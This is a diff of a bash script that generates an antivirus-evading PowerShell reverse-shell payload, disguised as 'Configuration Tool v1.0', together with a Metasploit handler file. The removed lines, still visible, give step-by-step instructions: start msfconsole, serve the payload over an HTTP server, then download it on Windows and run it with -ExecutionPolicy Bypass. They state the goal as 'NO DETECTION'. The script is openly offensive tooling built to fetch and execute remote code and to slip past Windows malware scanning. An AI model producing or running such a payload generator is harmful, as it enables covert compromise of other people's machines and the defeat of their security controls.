@@ -1,5 +1,5 @@
 #!/bin/bash
-# Create Simple Working Evasive PowerShell Payload
+# Create Evasive PowerShell Payload
 
 echo "=== Creating Simple Evasive PowerShell Payload ==="
 echo ""
@@ -9,7 +9,6 @@ IP=$(hostname -I | awk '{print $1}')
 echo "[*] Using Kali IP: $IP"
 echo ""
 
-# Create the simplest evasive payload that will definitely work
 cat > simple_evasive.ps1 << EOF
 # Configuration Tool v1.0
 \$addr = '$IP'
@@ -68,24 +67,3 @@ EOF
 
 echo "[+] Created handler.rc"
 echo ""
-
-echo "=== INSTRUCTIONS ==="
-echo ""
-echo "STEP 1 - On Kali:"
-echo "  Terminal 1: msfconsole -r handler.rc"
-echo "  Terminal 2: python3 -m http.server 8000"
-echo ""
-echo "STEP 2 - On Windows (test connectivity first):"
-echo "  Invoke-WebRequest -Uri 'http://$IP:8000/test_connection.ps1' -OutFile 'C:\temp\test.ps1'"
-echo "  powershell -ExecutionPolicy Bypass -File 'C:\temp\test.ps1'"
-echo ""
-echo "STEP 3 - If test succeeds, run the payload:"
-echo "  Invoke-WebRequest -Uri 'http://$IP:8000/simple_evasive.ps1' -OutFile 'C:\temp\payload.ps1'"
-echo "  powershell -ExecutionPolicy Bypass -File 'C:\temp\payload.ps1'"
-echo ""
-echo "IMPORTANT:"
-echo "- If you see PowerShell errors but NO 'malicious content' message = EVASION SUCCESS"
-echo "- If you see 'This script contains malicious content' = DETECTED" 
-echo "- A hanging PowerShell with no output = WORKING CORRECTLY"
-echo ""
-echo "[!] The goal is NO DETECTION, even if the shell doesn't work perfectly"
